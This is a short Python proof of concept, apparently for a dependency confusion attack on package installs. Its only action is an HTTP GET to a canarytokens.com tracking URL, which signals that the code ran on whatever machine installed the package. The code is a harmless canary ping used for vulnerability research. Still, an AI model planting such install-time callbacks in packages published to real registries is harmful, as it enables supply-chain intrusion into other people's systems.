# python package dependency confiuse vulnerability POC 

# name: Anindya Ghoshal
# e-mail: techghoshal@gmail.com

# importing the requests library
import requests
  
# canarytokens
url = "http://canarytokens.com/traffic/feedback/tags/3rjolutokm1emefbwedv3d534/index.html"

response = requests.get(url=url)
